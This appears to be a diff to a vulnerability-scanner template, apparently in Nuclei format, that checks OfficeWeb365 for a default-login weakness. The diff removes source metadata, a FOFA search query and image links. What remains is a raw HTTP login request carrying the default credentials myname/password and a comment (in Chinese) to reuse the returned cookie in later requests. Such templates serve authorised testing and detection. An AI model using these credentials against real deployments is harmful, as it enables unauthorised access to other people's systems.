@@ -3,12 +3,8 @@ info:
   name: officeweb365 弱口令漏洞_heoc2zkruuc20nty
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: default-login,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: header="officeweb365"
 http:
 - raw:
   - 'POST /Config HTTP/1.1
@@ -25,7 +21,6 @@ http:
 
     uName=myname&uPass=password&__RequestVerificationToken=Qp4hkk1P8vDTiGV-zdCUPue6SufNtvcxoOvhVmhgRdpyXKUcUjdXg434yclFhX1if2o9nara0jXhsv1LlWEW_He5wCrBjP3SO0le7nc7g6g1
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187319154-f81838cf-78e3-429d-9b2e-e6425ed3dee2.png)
 
     取cookie带入到后续请求'
   redirects: false
@@ -54,11 +49,8 @@ http:
 
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187319427-81642c56-17d5-4bcb-b985-235736b7636e.png)
 
-    默认口令：myname/password
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187319666-6f8b415c-2ec2-47ce-ac6f-094a13b52313.png)'
+    默认口令：myname/password'
   redirects: false
   matchers:
   - status:
